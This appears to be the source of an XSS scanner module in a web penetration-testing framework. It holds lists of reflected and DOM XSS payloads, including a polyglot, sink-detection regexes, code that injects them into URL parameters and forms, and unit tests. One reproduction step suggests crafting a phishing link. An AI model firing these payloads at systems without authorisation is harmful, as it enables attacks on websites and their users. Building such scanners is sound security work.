"""XSS Scanner — reflected, stored, DOM-based cross-site scripting detection."""
from __future__ import annotations

import hashlib
import re
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# Polyglot payloads — work across multiple XSS contexts
PAYLOADS_REFLECTED = [
    # Classic context breaks
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Event handlers (HTML attr context)
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "<body onload=alert(1)>",
    '"><svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<video src=x onerror=alert(1)>',
    # Script src / JS context
    "javascript:alert(1)",
    "'-alert(1)-'",
    '"-alert(1)-"',
    '${alert(1)}',
    # Template injection canary (also covered by ssti_scanner)
    '{{7*7}}',
    # iframe / link
    '"><iframe src="javascript:alert(1)">',
    "<a href=javascript:alert(1)>click</a>",
    # CSS / style injection
    "<style>*{background:url('javascript:alert(1)')}</style>",
    # Polyglot covering multiple contexts
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
    # Truncation-safe short payloads
    '<svg/onload=alert(1)>',
    '"><script>alert`1`</script>',
    # Encoded variants
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<<script>alert(1);//<</script>',
]

PAYLOADS_DOM = [
    "#<img src=x onerror=alert(1)>",
    "#<script>alert(1)</script>",
    "?debug=<img src=x onerror=alert(1)>",
    "#'-alert(1)-'",
    "#\"><img src=x onerror=alert(1)>",
    "?callback=alert(1)",
    "#javascript:alert(1)",
]

# DOM XSS sink patterns in JavaScript source
DOM_SINK_PATTERNS: list[tuple[str, str]] = [
    (r"innerHTML\s*=",              "innerHTML assignment (DOM XSS sink)"),
    (r"outerHTML\s*=",             "outerHTML assignment (DOM XSS sink)"),
    (r"document\.write\s*\(",       "document.write() (DOM XSS sink)"),
    (r"document\.writeln\s*\(",     "document.writeln() (DOM XSS sink)"),
    (r"\beval\s*\(",                "eval() — DOM XSS amplification sink"),
    (r"setTimeout\s*\(\s*['\"]",    "setTimeout with string arg (DOM XSS sink)"),
    (r"setInterval\s*\(\s*['\"]",   "setInterval with string arg (DOM XSS sink)"),
    (r"location\s*=\s*",            "location assignment (open redirect / DOM XSS)"),
    (r"location\.href\s*=",         "location.href assignment"),
    (r"location\.replace\s*\(",     "location.replace()"),
    (r"\.src\s*=",                  ".src assignment (script/img src)"),
    (r"insertAdjacentHTML\s*\(",    "insertAdjacentHTML() (DOM XSS sink)"),
    (r"createContextualFragment",   "createContextualFragment() (DOM XSS sink)"),
    (r"\$\s*\(\s*location",         "jQuery(location) — DOM XSS via jQuery"),
    (r"\.html\s*\(",                "jQuery .html() call (potential DOM XSS sink)"),
]

CANARY_PREFIX = "xssforge"

CVSS_XSS_STORED    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
CVSS_XSS_REFLECTED = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
CVSS_XSS_DOM       = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"


class XssScanner(BaseModule):
    """Cross-site scripting scanner for reflected, stored, DOM-based XSS."""

    NAME        = "xss_scanner"
    DESCRIPTION = "XSS scanner: reflected, stored, DOM-based detection"
    PHASE       = 4
    TAGS        = ["xss", "injection", "owasp-a03", "cwe-79"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        from webforge.core.session import ForgeSession
        async with ForgeSession(
            rate=self.config.rate.requests_per_second,
            proxy=self.config.extra.get("proxy"),
        ) as session:
            await self._test_url_params(session, target)
            for form in self.config.extra.get("found_forms", [])[:15]:
                await self._test_post_form(session, form, target)
            # Check JS files for DOM XSS sinks
            await self._check_dom_sinks(session, target)

        await self._test_dom_xss(target)
        return self._make_result(start)

    async def _test_post_form(self, session: Any, form: dict, target: str) -> None:
        action = form.get("action") or target
        inputs = form.get("inputs", [])
        if form.get("method", "GET").upper() != "POST" or not inputs:
            return

        for field_name in inputs:
            for payload in PAYLOADS_REFLECTED[:10]:
                await self.rate_limit()
                canary = f"{CANARY_PREFIX}{hashlib.md5(payload.encode()).hexdigest()[:8]}"
                tagged = payload.replace("alert(1)", f"alert('{canary}')")
                data   = {i: "test" for i in inputs}
                data[field_name] = tagged
                try:
                    resp = await session.post(action, data=data)
                    body = await resp.text()
                    if tagged in body or canary in body:
                        # Check if not HTML-encoded
                        if "&lt;" not in body[body.find(canary)-20:body.find(canary)+20]:
                            ev = Evidence(
                                request_raw=f"POST {action} | {field_name}={tagged}",
                                response_raw=body[:2000],
                                extra={"field": field_name, "payload": tagged},
                            )
                            self.new_finding(
                                title=f"Reflected XSS (POST) — Field '{field_name}'",
                                severity=Severity.HIGH,
                                description=(
                                    f"Reflected XSS in POST field '{field_name}' at {action}. "
                                    f"Payload {tagged!r} reflected without HTML encoding."
                                ),
                                reproduction_steps=[
                                    f"curl -X POST '{action}' -d '{field_name}={tagged}'",
                                    "Observe payload reflected unescaped in response",
                                ],
                                remediation=(
                                    "Apply context-aware output encoding. "
                                    "Use a templating engine with auto-escaping. "
                                    "Implement a strict Content Security Policy."
                                ),
                                references=["CWE-79", "OWASP A03:2021"],
                                evidence=ev,
                                cvss_v31_vector=CVSS_XSS_REFLECTED,
                                mitre_attack=["TA0004/T1059.007"],
                                target=action,
                            )
                            return
                except Exception:
                    pass

    async def _test_url_params(self, session: Any, url: str) -> None:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        for param_name in params:
            for payload in PAYLOADS_REFLECTED:
                await self.rate_limit()
                canary = f"{CANARY_PREFIX}{hashlib.md5(payload.encode()).hexdigest()[:8]}"
                tagged_payload = payload.replace("alert(1)", f"alert('{canary}')")
                test_url = self._inject_param(url, param_name, tagged_payload)
                try:
                    resp = await session.get(test_url)
                    body = await resp.text()
                    if tagged_payload in body or canary in body:
                        # Make sure it's not HTML-entity encoded
                        idx = body.find(canary)
                        context_slice = body[max(0, idx-30):idx+30]
                        if "&lt;" not in context_slice and "&amp;" not in context_slice:
                            ss = self.capture_screenshot(
                                test_url, f"xss_{param_name}",
                                highlight_js=(
                                    "document.querySelectorAll('script,img[onerror],svg[onload]')"
                                    ".forEach(function(e){e.style.outline='4px solid red'});"
                                )
                            )
                            ev = Evidence(
                                request_raw=f"GET {test_url}",
                                response_raw=body[:3000],
                                screenshot_path=ss,
                                extra={"param": param_name, "payload": tagged_payload},
                            )
                            self.new_finding(
                                title=f"Reflected XSS — Parameter '{param_name}'",
                                severity=Severity.HIGH,
                                description=(
                                    f"Reflected cross-site scripting (XSS) in parameter '{param_name}'. "
                                    f"Payload {tagged_payload!r} is reflected in the response without sanitisation. "
                                    "Attackers can steal session cookies, redirect users, or perform actions on their behalf."
                                ),
                                reproduction_steps=[
                                    f"Navigate to: {test_url}",
                                    "Observe the payload executed/reflected in the response",
                                    "Craft a phishing link with a malicious XSS payload to target users",
                                ],
                                remediation=(
                                    "Apply context-aware output encoding (HTML entity encoding for HTML context, "
                                    "JavaScript escaping for JS context). Use a Content Security Policy (CSP) header. "
                                    "Consider using a templating engine with auto-escaping enabled."
                                ),
                                references=["CWE-79", "OWASP A03:2021", "https://portswigger.net/web-security/cross-site-scripting"],
                                evidence=ev,
                                cvss_v31_vector=CVSS_XSS_REFLECTED,
                                mitre_attack=["TA0004/T1059.007"],
                                target=test_url,
                            )
                            break  # One finding per param is enough
                except Exception as exc:
                    self.log.debug("XSS test failed: %s", exc)

    async def _check_dom_sinks(self, session: Any, target: str) -> None:
        """Fetch JS files and scan for DOM XSS sinks in JavaScript source."""
        from urllib.parse import urlparse
        try:
            await self.rate_limit()
            resp = await session.get(target)
            html = await resp.text()
        except Exception:
            return

        # Find JS file references
        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I)
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        sinks_found: list[tuple[str, str, str]] = []  # (js_url, pattern, description)

        for js_path in js_urls[:20]:
            js_url = js_path if js_path.startswith("http") else f"{base}/{js_path.lstrip('/')}"
            if not self.check_scope(js_url):
                continue
            await self.rate_limit()
            try:
                r = await session.get(js_url)
                js_src = await r.text()
                for pattern, desc in DOM_SINK_PATTERNS:
                    if re.search(pattern, js_src):
                        sinks_found.append((js_url, pattern, desc))
            except Exception:
                pass

        # Also scan inline JS in the page
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)
        for script_content in inline_scripts:
            for pattern, desc in DOM_SINK_PATTERNS:
                if re.search(pattern, script_content):
                    sinks_found.append(("inline", pattern, desc))

        if sinks_found:
            unique_sinks = list({s[2]: s for s in sinks_found}.values())[:10]
            ev = Evidence(
                extra={"sinks": [(s[0][:80], s[2]) for s in unique_sinks]},
            )
            self.new_finding(
                title=f"DOM XSS Sinks Detected in JavaScript ({len(unique_sinks)} unique sinks)",
                severity=Severity.MEDIUM,
                description=(
                    f"Dangerous DOM XSS sinks found in JavaScript files/inline scripts at {target}. "
                    "These patterns may allow JavaScript to write attacker-controlled data into the DOM. "
                    f"Sinks found: {', '.join(s[2] for s in unique_sinks[:5])}"
                ),
                reproduction_steps=[
                    f"Review JavaScript files at {target}",
                    "Check if attacker-controlled data flows to: " + ", ".join(s[1] for s in unique_sinks[:3]),
                    "Use browser DevTools → Sources to trace data flows",
                ],
                remediation=(
                    "Avoid dangerous DOM sinks with user-controlled data. "
                    "Use textContent/setAttribute instead of innerHTML. "
                    "Sanitize data with DOMPurify before using in DOM operations."
                ),
                references=["CWE-79", "OWASP A03:2021"],
                evidence=ev,
                cvss_v31_vector=CVSS_XSS_DOM,
                mitre_attack=["TA0004/T1059.007"],
                target=target,
            )

    async def _test_dom_xss(self, url: str) -> None:
        """Check for DOM-based XSS using browser evaluation."""
        from webforge.core.browser_detect import get_browser_config, build_driver
        cfg = get_browser_config()
        if cfg is None:
            return

        for payload in PAYLOADS_DOM:
            test_url = url.rstrip("/") + payload
            driver = None
            try:
                driver = build_driver(cfg, headless=True)
                driver.get(test_url)
                import time as _time; _time.sleep(1)
                # Check for alert dialog (indicates XSS execution)
                try:
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.dismiss()
                    ss_path = str(self._screenshot_dir / f"dom_xss_{hash(payload)}.png")
                    ev = Evidence(
                        request_raw=f"GET {test_url}",
                        screenshot_path=ss_path,
                        extra={"payload": payload, "alert_text": alert_text},
                    )
                    self.new_finding(
                        title="DOM-Based XSS — Alert Executed",
                        severity=Severity.HIGH,
                        description=(
                            f"DOM-based XSS detected via URL fragment/parameter. "
                            f"Payload {payload!r} triggered JavaScript execution (alert: {alert_text!r}). "
                            "This executes entirely in the browser without server involvement."
                        ),
                        reproduction_steps=[
                            f"Navigate to: {test_url}",
                            "Observe JavaScript alert execution",
                        ],
                        remediation=(
                            "Sanitise data from URL fragments/parameters before using in DOM operations. "
                            "Avoid dangerous sinks: innerHTML, document.write, eval, setTimeout with string."
                        ),
                        references=["CWE-79", "OWASP A03:2021"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_XSS_DOM,
                        mitre_attack=["TA0004/T1059.007"],
                    )
                    break
                except Exception:
                    pass  # No alert = no DOM XSS for this payload
            except Exception as exc:
                self.log.debug("DOM XSS test failed: %s", exc)
            finally:
                if driver:
                    try: driver.quit()
                    except Exception: pass

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))


class TestXssScanner:
    def test_canary_prefix(self) -> None:
        assert CANARY_PREFIX == "xssforge"

    def test_payloads_not_empty(self) -> None:
        assert len(PAYLOADS_REFLECTED) >= 15
        assert len(PAYLOADS_DOM) >= 4

    def test_polyglot_payload_present(self) -> None:
        long_payloads = [p for p in PAYLOADS_REFLECTED if len(p) > 80]
        assert len(long_payloads) >= 1  # At least one polyglot

    def test_dom_sink_patterns_not_empty(self) -> None:
        assert len(DOM_SINK_PATTERNS) >= 10

    def test_inject_param(self) -> None:
        scanner = XssScanner.__new__(XssScanner)
        scanner.log = __import__("logging").getLogger("test")
        scanner._screenshot_dir = Path("/tmp")
        url = "https://example.com?q=hello"
        result = scanner._inject_param(url, "q", "<script>alert(1)</script>")
        assert "q=" in result
        assert "script" in result

    def test_dom_sink_patterns_compile(self) -> None:
        for pattern, _ in DOM_SINK_PATTERNS:
            compiled = re.compile(pattern)
            assert compiled is not None
